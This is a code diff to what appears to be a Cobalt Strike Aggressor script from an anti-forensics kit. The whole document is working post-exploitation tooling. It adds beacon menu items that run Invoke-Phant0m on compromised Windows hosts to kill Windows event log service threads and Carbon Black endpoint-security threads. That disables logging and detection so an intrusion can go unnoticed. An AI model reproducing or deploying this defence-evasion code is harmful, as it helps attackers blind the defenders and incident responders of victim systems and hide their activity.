@@ -27,13 +27,13 @@ popup beacon_bottom {
 					bpowershell($1, "Check-VM");
 				}
 			}
-			item "Kill Event Log Threads (Invoke-Phant0m)" {
+			item "Kill Event Log Threads with Invoke-Phant0m" {
 				local('$bid');
 				foreach $bid ($1){
 					binput($1, "powershell-import Invoke-Phant0m.ps1");
 					bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Invoke-Phant0m.ps1"));
-					binput($1, "powershell Invoke-Phant0m");
-					bpowershell($1, "Invoke-Phant0m");
+					binput($1, "powershell Invoke-Phant0m -processname eventlog -threadfilter evt");
+					bpowershell($1, "Invoke-Phant0m -processname eventlog -threadfilter evt");
 				}
 			}
 		}
@@ -73,6 +73,16 @@ popup beacon_bottom {
 					bpowershell($bid, "Restore-CarbonBlack");
 				}
 			}
+			item "Kill Kill Carbon Black Threads with Invoke-Phant0m" {
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell-import Invoke-Phant0m.ps1");
+					bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Invoke-Phant0m.ps1"));
+					binput($1, "powershell Invoke-Phant0m -processname CarbonBlack -threadfilter cb");
+					bpowershell($1, "Invoke-Phant0m -processname CarbonBlack -threadfilter cb");
+				}
+			}
+
 		}
 	}
 }
